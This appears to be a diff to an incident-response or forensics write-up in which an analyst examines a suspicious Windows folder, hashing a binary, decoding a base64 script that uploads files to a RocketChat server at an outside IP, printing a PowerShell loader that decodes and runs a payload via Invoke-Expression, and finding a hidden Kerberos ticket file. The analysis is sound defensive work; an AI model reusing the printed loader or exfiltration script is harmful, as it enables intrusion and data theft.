@@ -23,17 +23,25 @@ Mode                 LastWriteTime         Length Name
 -a----         4/13/2026  12:51 PM            485 Network_Share_Setup.ps1
 ```
 
+# lastrun.txt
 ```
 PS C:\Users\Administrator> type C:\Windows\System32\Network_Share_Scripts\lastrun.txt
 2026-06-05T08:50:01.5777641-04:00
+```
 
+# Hash of Network_setup.exe
+```
 PS C:\Users\Administrator> Get-FileHash -alg md5 C:\Windows\System32\Network_Share_Scripts\Network_setup.exe
 
 Algorithm       Hash                                                                   Path
 ---------       ----                                                                   ----
 MD5             E930B05EFE23891D19BC354A4209BE3E                                       C:\Windows\System32\Network_Share_Scripts\Network_setup.exe
+```
 
+# Network_Share_Login.b64 
+```
 PS C:\Users\Administrator> certutil -decode C:\Windows\System32\Network_Share_Scripts\Network_Share_Login.b64 C:\Windows\System32\Network_Share_Scripts\Network_Share_Login.txt
+
 PS C:\Users\Administrator> type C:\Windows\System32\Network_Share_Scripts\Network_Share_Login.txt
 # --- Configuration ---
 $RocketChatUrl = "203.0.113.150:3000"
@@ -103,4 +111,41 @@ if ($FilesToUpload.Count -eq 0) {
 $Now = Get-Date
 $Now.ToString("o") | Out-File -FilePath $LastRunFile -Force
 Write-Host "Updated last run time to $Now"
+```
+
+# Network_Share_Setup.ps1
+```
+PS C:\Users\Administrator> type C:\Windows\System32\Network_Share_Scripts\Network_Share_Setup.ps1
+$Path = "C:\Windows\System32\Network_Share_Scripts\Network_Share_Login.b64"
+
+if (-not (Test-Path $Path)) {
+    Write-Host "Payload file not found"
+    exit
+}
+
+try {
+    $Encoded = Get-Content $Path -Raw
+    $Bytes   = [Convert]::FromBase64String($Encoded)
+    $Decoded = [Text.Encoding]::Unicode.GetString($Bytes)
+
+    # Execute the decoded script
+    Invoke-Expression $Decoded
+}
+catch {
+    Write-Host "Error decoding or executing payload: $($_.Exception.Message)"
+}
+```
+
+# ticket.kirbi
+
+```
+PS C:\Users\Administrator> gci C:\Windows\System32\Network_Share_Scripts\ -Attributes hidden
+
+
+    Directory: C:\Windows\System32\Network_Share_Scripts
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-h--         3/27/2026   8:52 AM           1479 ticket.kirbi
 ```
